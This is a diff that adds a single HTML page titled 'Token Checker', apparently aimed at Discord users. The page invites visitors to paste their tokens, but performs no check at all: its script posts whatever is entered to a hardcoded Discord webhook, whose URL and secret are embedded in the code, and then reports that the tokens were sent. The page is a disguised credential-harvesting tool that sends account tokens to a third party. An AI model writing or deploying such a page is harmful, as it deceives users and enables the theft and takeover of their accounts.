@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Checker</title>
+    <style>
+        #token {
+            width: 80%;
+            height: 200px; /* Adjust the height as needed */
+        }
+    </style>
+</head>
+<body>
+    <h1>Token Checker</h1>
+    <form id="tokenForm">
+        <label for="token">Enter your tokens:</label><br>
+        <textarea id="token" name="token" required></textarea><br><br>
+        <button type="submit">Check Tokens</button>
+    </form>
+
+    <script>
+        document.getElementById("tokenForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+            
+            var tokens = document.getElementById("token").value;
+            var webhookURL = "https://discord.com/api/webhooks/1228569305524736081/bWbRM63T-iP4x9e-umKSfu3DJ5qHyqTObAPU1fLOhzrF4pFfjXwx4_Z2Vg2RSTSvq2c4";
+
+            // Create a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL);
+
+            // Set the content type to JSON
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            // Prepare the JSON data
+            var data = JSON.stringify({
+                content: "Tokens: " + tokens
+            });
+
+            // Send the request with the JSON data
+            xhr.send(data);
+
+            // Optionally, you can handle the response here
+            xhr.onload = function() {
+                if (xhr.status == 200) {
+                    console.log("Tokens successfully sent to webhook!");
+                    // Optionally, you can display a success message to the user
+                    alert("Tokens successfully sent to webhook!");
+                } else {
+                    console.error("Error sending tokens to webhook:", xhr.status);
+                    // Optionally, you can display an error message to the user
+                    alert("Error sending tokens to webhook. Please try again later.");
+                }
+            };
+        });
+    </script>
+</body>
+</html>
